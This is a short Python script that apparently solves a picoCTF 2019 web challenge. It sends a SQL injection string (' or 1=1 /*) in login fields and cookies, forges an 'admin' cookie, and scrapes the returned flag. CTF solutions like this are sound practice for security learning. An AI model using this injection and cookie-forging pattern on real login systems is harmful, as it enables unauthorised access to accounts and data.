from requests import *
from bs4 import BeautifulSoup

url = 'https://2019shell1.picoctf.com/problem/32270/flag'
data = {
    'user' : "' or 1=1 /*",
    'password' : '123'
}
cookies = {
    'username' : "' or 1=1 /*",
    'password' : '123',
    'admin' : 'True'
}

r = get(url , data=data , cookies=cookies)
soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('code').get_text()
print(flag)
